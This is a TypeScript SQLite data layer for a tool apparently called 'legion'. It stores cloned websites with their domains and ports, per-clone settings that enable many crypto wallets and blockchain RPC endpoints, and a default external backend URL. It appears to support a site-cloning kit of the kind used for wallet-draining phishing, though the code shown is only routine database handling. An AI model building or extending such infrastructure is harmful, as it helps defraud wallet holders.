import Database from 'better-sqlite3';
import { join } from 'path';

const dbPath = join(process.cwd(), 'legion.db');
let db: Database.Database | null = null;

export function getDb() {
  if (!db) {
    db = new Database(dbPath);
    initializeDatabase();
  }
  return db;
}

function initializeDatabase() {
  const database = getDb();

  // Clone metadata table
  database
    .exec(`
    CREATE TABLE IF NOT EXISTS clones (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      url TEXT NOT NULL,
      domain TEXT NOT NULL,
      port INTEGER NOT NULL,
      enableSSL BOOLEAN NOT NULL,
      status TEXT DEFAULT 'created',
      createdAt TEXT NOT NULL,
      lastUpdated TEXT NOT NULL
    )
  `);

  // Configuration table
  database
    .exec(`
    CREATE TABLE IF NOT EXISTS configurations (
      id TEXT PRIMARY KEY,
      cloneId TEXT NOT NULL,
      rpcEvm TEXT,
      rpcSolana TEXT,
      rpcTron TEXT,
      rpcTon TEXT,
      rpcBitcoin TEXT,
      walletMetamask BOOLEAN DEFAULT 1,
      walletCoinbase BOOLEAN DEFAULT 1,
      walletTrust BOOLEAN DEFAULT 1,
      walletPhantom BOOLEAN DEFAULT 1,
      walletRabby BOOLEAN DEFAULT 1,
      walletSolflare BOOLEAN DEFAULT 1,
      walletConnectEnabled BOOLEAN DEFAULT 1,
      walletLedger BOOLEAN DEFAULT 1,
      walletTrezor BOOLEAN DEFAULT 1,
      backendUrl TEXT,
      createdAt TEXT NOT NULL,
      updatedAt TEXT NOT NULL,
      FOREIGN KEY (cloneId) REFERENCES clones(id)
    )
  `);

  // Logs table
  database
    .exec(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      cloneId TEXT,
      type TEXT,
      message TEXT NOT NULL,
      timestamp TEXT NOT NULL,
      FOREIGN KEY (cloneId) REFERENCES clones(id)
    )
  `);

  // Docker containers table
  database
    .exec(`
    CREATE TABLE IF NOT EXISTS containers (
      id TEXT PRIMARY KEY,
      cloneId TEXT NOT NULL,
      name TEXT NOT NULL,
      status TEXT,
      port INTEGER,
      createdAt TEXT NOT NULL,
      FOREIGN KEY (cloneId) REFERENCES clones(id)
    )
  `);
}

export function addClone(
  name: string,
  url: string,
  domain: string,
  port: number,
  enableSSL: boolean
) {
  const db = getDb();
  const id = `${name}-${Date.now()}`;
  const now = new Date().toISOString();

  const stmt = db.prepare(`
    INSERT INTO clones (id, name, url, domain, port, enableSSL, status, createdAt, lastUpdated)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  stmt.run(id, name, url, domain, port, enableSSL ? 1 : 0, 'created', now, now);

  // Create default configuration
  const configId = `config-${id}`;
  const configStmt = db.prepare(`
    INSERT INTO configurations (
      id, cloneId, rpcEvm, rpcSolana, rpcTron, rpcTon, rpcBitcoin,
      walletMetamask, walletCoinbase, walletTrust, walletPhantom,
      walletRabby, walletSolflare, walletConnectEnabled, walletLedger, walletTrezor,
      backendUrl, createdAt, updatedAt
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  configStmt.run(
    configId,
    id,
    'https://eth-mainnet.infura.io/v3/YOUR_KEY',
    'https://api.mainnet-beta.solana.com',
    'https://api.trongrid.io',
    'https://tonrpc.com',
    'https://mempool.space/api',
    1, 1, 1, 1, 1, 1, 1, 1, 1,
    'https://sadrailala-production.up.railway.app',
    now,
    now
  );

  return id;
}

export function getClones() {
  const db = getDb();
  const stmt = db.prepare('SELECT * FROM clones ORDER BY createdAt DESC');
  return stmt.all();
}

export function getClone(id: string) {
  const db = getDb();
  const stmt = db.prepare('SELECT * FROM clones WHERE id = ?');
  return stmt.get(id);
}

export function updateCloneStatus(id: string, status: string) {
  const db = getDb();
  const stmt = db.prepare(
    'UPDATE clones SET status = ?, lastUpdated = ? WHERE id = ?'
  );
  stmt.run(status, new Date().toISOString(), id);
}

export function getConfiguration(cloneId: string) {
  const db = getDb();
  const stmt = db.prepare('SELECT * FROM configurations WHERE cloneId = ?');
  return stmt.get(cloneId);
}

export function updateConfiguration(cloneId: string, config: any) {
  const db = getDb();
  const stmt = db.prepare(`
    UPDATE configurations SET
      rpcEvm = ?, rpcSolana = ?, rpcTron = ?, rpcTon = ?, rpcBitcoin = ?,
      walletMetamask = ?, walletCoinbase = ?, walletTrust = ?, walletPhantom = ?,
      walletRabby = ?, walletSolflare = ?, walletConnectEnabled = ?,
      walletLedger = ?, walletTrezor = ?, backendUrl = ?, updatedAt = ?
    WHERE cloneId = ?
  `);

  stmt.run(
    config.rpcEvm,
    config.rpcSolana,
    config.rpcTron,
    config.rpcTon,
    config.rpcBitcoin,
    config.walletMetamask ? 1 : 0,
    config.walletCoinbase ? 1 : 0,
    config.walletTrust ? 1 : 0,
    config.walletPhantom ? 1 : 0,
    config.walletRabby ? 1 : 0,
    config.walletSolflare ? 1 : 0,
    config.walletConnectEnabled ? 1 : 0,
    config.walletLedger ? 1 : 0,
    config.walletTrezor ? 1 : 0,
    config.backendUrl,
    new Date().toISOString(),
    cloneId
  );
}

export function addLog(cloneId: string, type: string, message: string) {
  const db = getDb();
  const stmt = db.prepare(`
    INSERT INTO logs (cloneId, type, message, timestamp)
    VALUES (?, ?, ?, ?)
  `);
  stmt.run(cloneId, type, message, new Date().toISOString());
}

export function getLogs(cloneId: string, limit: number = 100) {
  const db = getDb();
  const stmt = db.prepare(
    'SELECT * FROM logs WHERE cloneId = ? ORDER BY timestamp DESC LIMIT ?'
  );
  return stmt.all(cloneId, limit).reverse();
}

export function deleteClone(id: string) {
  const db = getDb();
  db.prepare('DELETE FROM configurations WHERE cloneId = ?').run(id);
  db.prepare('DELETE FROM logs WHERE cloneId = ?').run(id);
  db.prepare('DELETE FROM containers WHERE cloneId = ?').run(id);
  db.prepare('DELETE FROM clones WHERE id = ?').run(id);
}
